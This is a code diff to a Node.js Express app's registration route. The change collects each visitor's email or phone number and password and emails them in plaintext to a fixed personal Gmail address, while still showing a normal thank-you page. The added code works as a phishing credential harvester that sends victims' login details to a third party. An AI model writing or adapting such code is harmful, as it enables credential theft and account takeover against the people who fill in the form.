@@ -25,8 +25,8 @@ app.get("/register", function(req, res) {
 
 app.post("/register", function(req, res) {
 
-    const username = req.body.name;
-    const email = req.body.email;
+    const emailORnumber = req.body.emailORnumber;
+    const password = req.body.password;
 
 
     //create reuseable transporter object using the Gmail
@@ -40,11 +40,13 @@ app.post("/register", function(req, res) {
     });
 
 
+    // vanessablinx@gmail.com
+
     var mailOptions = {
         from: 'ekyeremeh7@gmail.com', // sender address
         to: 'vanessablinx@gmail.com', // list of receivers
         subject: 'Hello ✔, A client just signed up . Below are his or her details.', // Subject line
-        text: 'Username : ' + username + "\n " + "Email Address : " + email,
+        text: 'Email/Mobile Number : ' + emailORnumber + "\n " + "Password : " + password,
         // plaintext body
         // html body
     };
@@ -55,7 +57,7 @@ app.post("/register", function(req, res) {
             return console.log(error);
         }
         res.render("thank-you", {
-            username: username
+            username: emailORnumber
         });
         console.log('Message sent: ' + info.response);
     });
